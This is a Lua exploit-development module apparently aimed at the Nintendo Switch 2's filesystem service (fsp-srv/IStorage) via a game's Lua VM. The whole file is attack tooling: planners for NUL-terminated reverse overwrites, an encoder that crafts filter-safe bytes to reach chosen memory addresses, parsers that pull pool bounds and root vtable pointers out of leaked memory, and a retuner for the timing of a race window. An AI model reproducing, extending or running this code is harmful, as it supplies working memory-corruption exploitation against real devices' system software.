-- s2_fs.lua — Signed-Cache Planner, Root Layout Analyzer & fsp-srv / IStorage Helpers
-- Target: Switch 2 (Ounce) — Seedsow Lullaby (Artemis Lua 5.1 VM)

local P = require("s2_prim")

local M = {}

local math_floor = math.floor
local math_ceil  = math.ceil
local math_min   = math.min
local math_max   = math.max
local math_abs   = math.abs
local str_byte   = string.byte
local str_char   = string.char
local str_sub    = string.sub
local str_rep    = string.rep
local str_format = string.format
local tbl_concat = table.concat

-- ---------------------------------------------------------------------------
-- 1. Path & NUL-Terminated Reverse Overwrite Planners
-- ---------------------------------------------------------------------------
function M.normalized_path(prefix, length)
    local text = prefix
    while #text < length do
        local remaining = length - #text
        if remaining == 1 then
            text = text .. "A"
        else
            text = text .. "/" .. str_rep("A", math_min(32, remaining - 1))
        end
    end
    return text
end

-- Compute reverse NUL-terminated write steps (matches helpers/wave.mjs nulWrites)
function M.nul_writes(desired)
    local bytes
    if type(desired) == "string" then
        bytes = P.str_to_bytes(desired)
    else
        bytes = {}
        for i = 1, #desired do bytes[i] = desired[i] end
    end
    local last = -1
    for i = #bytes, 1, -1 do
        if bytes[i] ~= 0 then
            last = i - 1 -- 0-based index
            break
        end
    end
    if last + 1 >= #bytes then
        error("nul_writes: needs trailing zero")
    end
    local ends = {last + 1}
    for e = last, 0, -1 do
        if bytes[e + 1] == 0 then
            ends[#ends + 1] = e
        end
    end
    local steps = {}
    for _, e in ipairs(ends) do
        local step_bytes = {}
        for i = 1, e do
            local b = bytes[i]
            step_bytes[i] = (b and b ~= 0) and b or 0x42
        end
        steps[#steps + 1] = {
            ["end"] = e,
            bytes = step_bytes,
            str = P.bytes_to_str(step_bytes)
        }
    end
    return steps
end

-- ---------------------------------------------------------------------------
-- 2. Signed-Cache Offset Encoder & Lower-Window Address Planner (CachePlan)
-- ---------------------------------------------------------------------------
local PLAN_DEFAULTS = {
    controlSize               = 0x4000,
    supportedCycles           = {0x28000, 0x500000},
    withinOffsets             = {0, 0x40, 0x140, 0x200},
    minimumTarget             = 0x100000000,
    maximumTargetExclusive    = 549755813888, -- 2^39
    lowerWindowMaxPrefix      = 0x4000000,
    lowerWindowStorageReserve = 0x8000,
}

-- Add two 8-byte little-endian byte arrays modulo 2^64
local function add_u64_le_bytes(a, b)
    local out = {}
    local carry = 0
    for i = 1, 8 do
        local sum = (a[i] or 0) + (b[i] or 0) + carry
        out[i] = sum % 256
        carry = math_floor(sum / 256)
    end
    return out
end

function M.encode_signed_cache_offset(bias, bucket_count)
    local block_size = PLAN_DEFAULTS.controlSize
    if not bias or bias < 0 or bias >= PLAN_DEFAULTS.maximumTargetExclusive or
       not bucket_count or bucket_count <= 0 then
        return nil
    end

    local odd = bucket_count
    local power = 0
    while (odd % 2) == 0 do
        odd = odd / 2
        power = power + 1
    end
    local zero_bits = ((2 ^ power) - 1) * block_size

    local displacement = {}
    local w = bias
    for i = 1, 8 do
        local q = math_floor(w / 256)
        displacement[i] = w - q * 256
        w = q
    end

    -- (1 << 50) % odd; 2^50 = 1125899906842624 is exact in IEEE-754 double
    local wanted = 1125899906842624 % odd
    local misses = {}

    local function choose(position, left_state, right_state, carry, remainder)
        if position == 8 then
            if left_state[1] == 0 and right_state[1] == 0 and remainder == wanted then
                return {}
            end
            return nil
        end

        local key = str_format("%d,%d:%d:%d,%d:%d:%d,%d,%d",
            position,
            left_state[1], left_state[2], left_state[3],
            right_state[1], right_state[2], right_state[3],
            carry, remainder)
        if misses[key] then return nil end

        local first = 1
        if position == 6 then
            first = 0xC2
        elseif position == 7 then
            first = 0x81
        end
        local last = (position >= 6) and first or 0xF4
        local mask = math_floor(zero_bits / (2 ^ (position * 8))) % 256

        for left = first, last do
            if left ~= 0 and left ~= 0x2F and left ~= 0x5C and P.band32(left, mask) == 0 then
                local total = left + displacement[position + 1] + carry
                local right = total % 256
                if right ~= 0 and right ~= 0x2F and right ~= 0x5C then
                    local next_left  = P.utf8_step(left_state, left)
                    local next_right = P.utf8_step(right_state, right)
                    if next_left and next_right then
                        local contribution = 0
                        if position == 1 then
                            contribution = math_floor(left / 64)
                        elseif position >= 2 then
                            local pow_mod = 1
                            local exp = position * 8 - 14
                            for _ = 1, exp do
                                pow_mod = (pow_mod * 2) % odd
                            end
                            contribution = (left * pow_mod) % odd
                        end
                        local suffix = choose(
                            position + 1,
                            next_left,
                            next_right,
                            math_floor(total / 256),
                            (remainder + contribution) % odd
                        )
                        if suffix then
                            local res = {left}
                            for i = 1, #suffix do res[i + 1] = suffix[i] end
                            return res
                        end
                    end
                end
            end
        end
        misses[key] = true
        return nil
    end

    local encoded = choose(0, {0, 0, 0}, {0, 0, 0}, 0, 0)
    if not encoded then return nil end
    local base_bytes = add_u64_le_bytes(encoded, displacement)
    return {
        bytes      = encoded,
        str        = P.bytes_to_str(encoded),
        base_bytes = base_bytes,
        base_str   = P.bytes_to_str(base_bytes)
    }
end

function M.build_signed_cache_plan(target, storage_size, cycle)
    local block = PLAN_DEFAULTS.controlSize
    cycle = cycle or PLAN_DEFAULTS.supportedCycles[1]
    if not target or target < PLAN_DEFAULTS.minimumTarget or target >= PLAN_DEFAULTS.maximumTargetExclusive then
        error("Target is outside the configured address width")
    end
    if not storage_size or storage_size < block then
        error("IStorage size is invalid")
    end
    if (cycle % block) ~= 0 then
        error("Unsupported cache bucket period")
    end

    local bucket_count = cycle / block
    local start = 0
    while start + block <= storage_size do
        for _, within in ipairs(PLAN_DEFAULTS.withinOffsets) do
            local read_offset = start + within
            if read_offset + block <= storage_size then
                local address_bias = target - read_offset
                local encoded = M.encode_signed_cache_offset(address_bias, bucket_count)
                if encoded then
                    local bytes = {}
                    for i = 1, 0x28 do bytes[i] = 0x41 end
                    for i = 1, 8 do bytes[i] = encoded.bytes[i] end
                    for i = 9, 16 do bytes[i] = 0x7E end
                    for i = 17, 20 do bytes[i] = 1 end
                    for i = 1, 8 do bytes[0x20 + i] = encoded.base_bytes[i] end
                    return {
                        target         = target,
                        storageSize    = storage_size,
                        readOffset     = read_offset,
                        addressBias    = address_bias,
                        cycle          = cycle,
                        offsetBytes    = encoded.bytes,
                        offsetStr      = encoded.str,
                        baseBytes      = encoded.base_bytes,
                        baseStr        = encoded.base_str,
                        bytes          = bytes,
                        str            = P.bytes_to_str(bytes)
                    }
                end
            end
        end
        start = start + cycle
    end
    error("No signed cache encoding fits measured IStorage")
end

function M.build_lower_window_plan(target, storage_size, cycle, pointers)
    local block = PLAN_DEFAULTS.controlSize
    cycle = cycle or PLAN_DEFAULTS.supportedCycles[1]
    if not pointers or #pointers == 0 then
        error("Lower-window plan needs an observed pointer")
    end
    local low = pointers[1]
    for i = 1, #pointers do
        local p = pointers[i]
        if not p or p < PLAN_DEFAULTS.minimumTarget or p >= PLAN_DEFAULTS.maximumTargetExclusive or (p % block) ~= 0 then
            error("Observed pointer is not a qualified cache-block address")
        end
        if p < low then low = p end
    end

    local max_prefix = math_min(
        PLAN_DEFAULTS.lowerWindowMaxPrefix,
        storage_size - PLAN_DEFAULTS.lowerWindowStorageReserve,
        target - PLAN_DEFAULTS.minimumTarget
    )
    local prefix = math_floor(max_prefix / cycle) * cycle
    if prefix <= 0 then
        error("No lower-window prefix fits measured IStorage")
    end

    local plan = M.build_signed_cache_plan(target - prefix, storage_size, cycle)
    plan.target = target
    plan.readOffset = plan.readOffset + prefix
    plan.lowerWindow = {
        lowestObservedPointer = low,
        proposedStart         = target - prefix,
        prefix                = prefix,
        qualification         = "lower mapping remains unverified"
    }
    if (plan.addressBias + plan.readOffset) ~= target or
       ((math_floor(plan.readOffset / block) * block) % cycle) ~= 0 or
       (plan.readOffset + block) > storage_size then
        error("Lower-window plan failed arithmetic checks")
    end
    return plan
end

-- ---------------------------------------------------------------------------
-- 3. Allocator Pool & Root Domain Layout Parsers (RootLayout)
-- ---------------------------------------------------------------------------
local LAYOUT_DEFAULTS = {
    controlSize             = 0x4000,
    poolSize                = 0x2000000,
    poolAlignment           = 0x200000,
    maxPoolCandidates       = 4,
    minimumPointer          = 0x100000000,
    maximumPointerExclusive = 549755813888, -- 0x8000000000
    externalLinkMinDist     = 0x8000000,
    minimumExtent           = 0x10000,
    maximumExtent           = 0x10000000,
    extentAlignment         = 0x1000,
    metadataBlockSize       = 0x4000,
    metadataPageSize        = 0x1000,
}

function M.range_contains(start_addr, length, address, size)
    return start_addr and length and address and size and
           length > 0 and size > 0 and
           address >= start_addr and (address + size) <= (start_addr + length)
end

function M.is_canonical_pointer(val)
    if type(val) == "string" then
        if #val ~= 8 then return false end
        local lo, hi = P.u32(val, 0), P.u32(val, 4)
        if hi < 1 or hi >= 0x80 or (lo % 8) ~= 0 then return false end
        return true
    end
    return type(val) == "number" and
           val >= LAYOUT_DEFAULTS.minimumPointer and
           val < LAYOUT_DEFAULTS.maximumPointerExclusive and
           (val % 8) == 0
end

function M.derive_pool_bounds(links, seed)
    local pool_size = LAYOUT_DEFAULTS.poolSize
    local alignment = LAYOUT_DEFAULTS.poolAlignment
    local ctrl_size = LAYOUT_DEFAULTS.controlSize
    if not links or #links == 0 or not seed or (seed % ctrl_size) ~= 0 then
        return {candidates = {}, size = pool_size, alignment = alignment}
    end
    local candidates = {}
    local first_start = math_ceil((seed + ctrl_size - pool_size) / alignment) * alignment
    local start_addr = first_start
    while start_addr <= seed do
        local inside = {}
        for i = 1, #links do
            local lnk = links[i]
            if lnk.source >= start_addr and (lnk.source + ctrl_size) <= (start_addr + pool_size) then
                inside[#inside + 1] = lnk
            end
        end
        if #inside > 0 then
            local all_inside = true
            for j = 1, #inside do
                local v = inside[j].value
                if v < start_addr or (v + ctrl_size) > (start_addr + pool_size) then
                    all_inside = false
                    break
                end
            end
            if all_inside then
                candidates[#candidates + 1] = start_addr
            end
        end
        start_addr = start_addr + alignment
    end
    return {
        first         = (#candidates > 0) and candidates[1] or nil,
        last          = (#candidates > 0) and candidates[#candidates] or nil,
        candidates    = candidates,
        size          = pool_size,
        alignment     = alignment,
        observedLinks = #links
    }
end

function M.choose_pool_refinement_start(bounds, links, captures, bias, cycle, attempt_index)
    if not bounds or not bounds.candidates or not links or not captures or
       not cycle or cycle <= 0 or #bounds.candidates <= LAYOUT_DEFAULTS.maxPoolCandidates then
        return nil
    end

    local function covered(s)
        for i = 1, #captures do
            local item = captures[i]
            if item.address <= s and (s + cycle) <= (item.address + item.length) then
                return true
            end
        end
        return false
    end

    local function inside(s)
        return s >= bounds.last and (s + cycle) <= (bounds.first + bounds.size)
    end

    local targets, seen = {}, {}
    for i = 1, #links do
        local t = links[i].value
        if not seen[t] then
            seen[t] = true
            targets[#targets + 1] = t
        end
    end
    table.sort(targets, function(a, b)
        if (attempt_index % 2) == 1 then return a > b end
        return a < b
    end)

    for i = 1, #targets do
        local t_start = bias + math_floor((targets[i] - bias) / cycle) * cycle
        if inside(t_start) and not covered(t_start) then
            return t_start
        end
    end

    local s = bias + math_ceil((bounds.last - bias) / cycle) * cycle
    while inside(s) do
        if not covered(s) then return s end
        s = s + cycle
    end
    return nil
end

function M.parse_external_link(next_val, prev_val, extent_val, anchor_address)
    if not M.is_canonical_pointer(next_val) then return nil end
    if next_val ~= prev_val then return nil end
    local dist = math_abs(next_val - anchor_address)
    if dist <= LAYOUT_DEFAULTS.externalLinkMinDist then return nil end
    if extent_val < LAYOUT_DEFAULTS.minimumExtent or
       extent_val > LAYOUT_DEFAULTS.maximumExtent or
       (extent_val % LAYOUT_DEFAULTS.extentAlignment) ~= 0 then
        return nil
    end
    return {next = next_val, previous = prev_val, extent = extent_val}
end

function M.metadata_window_from_next(next_val)
    if not M.is_canonical_pointer(next_val) then return nil end
    local block_off = next_val % LAYOUT_DEFAULTS.metadataBlockSize
    local length = (block_off >= LAYOUT_DEFAULTS.metadataPageSize)
        and LAYOUT_DEFAULTS.metadataPageSize
        or LAYOUT_DEFAULTS.metadataBlockSize
    local page = math_floor(next_val / length) * length
    return {
        address             = page,
        length              = length,
        anchorOffset        = next_val - page,
        originalBlockOffset = block_off
    }
end

function M.make_domain_candidate(address, first, second, manager, domain_delta, root_delta)
    domain_delta = domain_delta or 0x58
    root_delta   = root_delta or 0x28E0
    if (second - first) ~= domain_delta or first < root_delta then return nil end
    if not M.is_canonical_pointer(first) or
       not M.is_canonical_pointer(second) or
       not M.is_canonical_pointer(manager) then
        return nil
    end
    local root_vptr = first - root_delta
    if not M.is_canonical_pointer(root_vptr) or (root_vptr + 0x5880) >= 549755813888 then
        return nil
    end
    return {
        address  = address,
        first    = first,
        second   = second,
        rootVptr = root_vptr,
        manager  = manager
    }
end

function M.group_domain_candidates(candidates)
    local groups = {}
    local idx_map = {}
    for i = 1, #candidates do
        local c = candidates[i]
        local key = str_format("%x:%x", c.rootVptr, c.manager)
        local g_idx = idx_map[key]
        if not g_idx then
            g_idx = #groups + 1
            idx_map[key] = g_idx
            groups[g_idx] = {rootVptr = c.rootVptr, manager = c.manager, domains = {}}
        end
        local doms = groups[g_idx].domains
        doms[#doms + 1] = c
    end
    return groups
end

-- Adaptive wave timing retuner (matches campaign.mjs applyTimingAdjustments)
local function list_has(t, v)
    if not t then return false end
    for i = 1, #t do if t[i] == v then return true end end
    return false
end

local function median_num(vals)
    if not vals or #vals == 0 then return nil end
    local s = {}
    for i = 1, #vals do s[i] = vals[i] end
    table.sort(s)
    local mid = math_floor(#s / 2) + 1
    return (#s % 2 == 1) and s[mid] or ((s[mid - 1] + s[mid]) / 2)
end

function M.retune_wave_schedule(state, config, log_fn)
    local baseline = config.timingBaseline or {
        roleDelays  = {unpack(config.roleDelays)},
        guardDelays = {unpack(config.guardDelays)},
    }
    local records, allow_mixed = nil, false
    if #state.positiveRecords > 0 and (state.positiveWindows / #state.positiveRecords) < 0.8 then
        records = state.positiveRecords
    elseif #state.positiveRecords == 0 then
        local ctrl_recs, ctrl_wins = {}, 0
        for _, r in ipairs(state.waveRecords or {}) do
            if r.profile == "extent-present" or r.profile == "negative" then
                ctrl_recs[#ctrl_recs + 1] = r
                if r.window then ctrl_wins = ctrl_wins + 1 end
            end
        end
        if #ctrl_recs >= 2 and (ctrl_wins / #ctrl_recs) < 0.8 then
            records, allow_mixed = ctrl_recs, true
        end
    end
    if records then
        local shape_recs, margin_recs = {}, {}
        for _, rec in ipairs(records) do
            local rej = rec.rejections or {}
            local hs, hm = list_has(rej, "shape-10"), list_has(rej, "margin>=300")
            if not rec.window and (hs or hm) and (allow_mixed or #rej == 1) then
                if hs then shape_recs[#shape_recs + 1] = rec end
                if hm then margin_recs[#margin_recs + 1] = rec end
            end
        end
        local corr_role, corr_samples = nil, nil
        if #margin_recs >= 2 and #margin_recs > #shape_recs then
            local samples = {}
            for _, r in ipairs(margin_recs) do
                if r.marginUs then samples[#samples + 1] = r.marginUs - 500 end
            end
            if #samples >= 2 then corr_role, corr_samples = "release", samples end
        elseif #shape_recs >= 2 and #shape_recs > #margin_recs then
            local by_role = {}
            for _, r in ipairs(shape_recs) do
                local rt_map = r.roleTimings or {}
                local trig = rt_map["trigger"]
                if trig then
                    local seen_r = {}
                    for _, role in ipairs(r.shapeMissing or {}) do
                        if not seen_r[role] and role ~= "guard1" and rt_map[role] then
                            seen_r[role] = true
                            local r_t = rt_map[role]
                            local target_mid = nil
                            if list_has(config.throughRoles, role) then
                                if r_t.durationUs > (trig.relEndUs - trig.relStartUs) then
                                    target_mid = (trig.relStartUs + trig.relEndUs) / 2
                                end
                            elseif list_has(config.heldRoles, role) then
                                target_mid = trig.relStartUs
                            end
                            if target_mid then
                                by_role[role] = by_role[role] or {}
                                by_role[role][#by_role[role] + 1] = target_mid - ((r_t.relStartUs + r_t.relEndUs) / 2)
                            end
                        end
                    end
                end
            end
            local ranked = {}
            for role, arr in pairs(by_role) do ranked[#ranked + 1] = {role = role, samples = arr} end
            table.sort(ranked, function(a, b) return #a.samples > #b.samples end)
            if #ranked > 0 and #ranked[1].samples >= 2 and (not ranked[2] or #ranked[2].samples < #ranked[1].samples) then
                corr_role, corr_samples = ranked[1].role, ranked[1].samples
            end
        end
        local med_us = corr_samples and median_num(corr_samples) or nil
        if corr_role and med_us and math_abs(med_us) >= 75 then
            local step_us = math_max(-250, math_min(250, med_us))
            local role_idx = nil
            for i, lbl in ipairs(config.roleLabels) do
                if lbl == corr_role then role_idx = i - 1; break end
            end
            if role_idx then
                local is_guard = (corr_role == "guard0" or corr_role == "guard1")
                local d_idx = (is_guard and (role_idx - 10) or role_idx) + 1
                local delays = is_guard and config.guardDelays or config.roleDelays
                local base_d = is_guard and baseline.guardDelays or baseline.roleDelays
                if d_idx >= 1 and d_idx <= #delays then
                    local before = delays[d_idx]
                    local min_d = math_max(0, base_d[d_idx] - 1000000)
                    local max_d = base_d[d_idx] + 1000000
                    if d_idx > 1 then min_d = math_max(min_d, delays[d_idx - 1] + 50000) end
                    if d_idx < #delays then max_d = math_min(max_d, delays[d_idx + 1] - 50000) end
                    if min_d <= max_d then
                        local after = math_max(min_d, math_min(max_d, before + math_floor(step_us * 1000 + 0.5)))
                        if after ~= before then
                            delays[d_idx] = after
                            local delta_us = (after - before) / 1000
                            state.timingAdjustments = {{role = corr_role, deltaUs = delta_us, delayNs = after}}
                            if log_fn then log_fn(str_format("TIMING RETUNE: %s %+.0fus -> %dns", corr_role, delta_us, after)) end
                        end
                    end
                end
            end
        end
    end
    state.timingSchedule = {
        roleDelays          = {unpack(config.roleDelays)},
        guardDelays         = {unpack(config.guardDelays)},
        baselineRoleDelays  = baseline.roleDelays,
        baselineGuardDelays = baseline.guardDelays,
    }
end

-- ---------------------------------------------------------------------------
-- 4. High-Level `fsp-srv` / `IFileSystem` / `IStorage` / Reservation Wrappers
-- ---------------------------------------------------------------------------
require("s2_fshlp").attach(M)

return M
